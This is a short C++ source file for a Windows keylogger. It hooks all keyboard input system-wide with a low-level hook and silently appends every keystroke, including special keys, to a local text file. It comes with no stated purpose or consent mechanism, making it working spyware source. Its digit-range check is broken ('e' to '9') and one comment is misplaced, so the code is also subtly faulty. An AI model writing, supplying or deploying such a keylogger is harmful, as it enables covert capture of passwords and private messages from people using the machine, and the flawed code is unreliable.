#include <iostream>
#include <fstream>
#include <Windows.h>

void logKeyStroke(int key){
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios::app);
  

    if (key == VK_BACK)
          logfile << "[BACKSPACE]";
      else if (key == VK_RETURN)
           logfile << "[ENTER]";
      else if (key == VK_SPACE)
           logfile << " ";
      else if (key == VK_TAB)
           logfile << "[TAB]";
      else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
           logfile << "[SHIFT]";
      else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
           logfile << "[CTRL]";
      else if (key == VK_ESCAPE)
           logfile << "[ESC]";
      else if (key ==  VK_OEM_PERIOD)
           logfile << "."; // Log alphabetic keys (A-Z) and numbers (0-9) as the character itself.
      else if (key >= 'A' && key <= 'Z')
           logfile << char(key); // Log the uppercase letter pressed.
      else if (key >= 'e' && key <= '9')
           logfile << char(key); // Log the number pressed.
      else
           logfile << "[" << key << "]"; // Log other keys using their virtual keycode
      logfile.close();
}

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
            int key = pKeyBoard->vkCode;
            logKeyStroke(key);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main(){
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL , 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    
    return 0;
}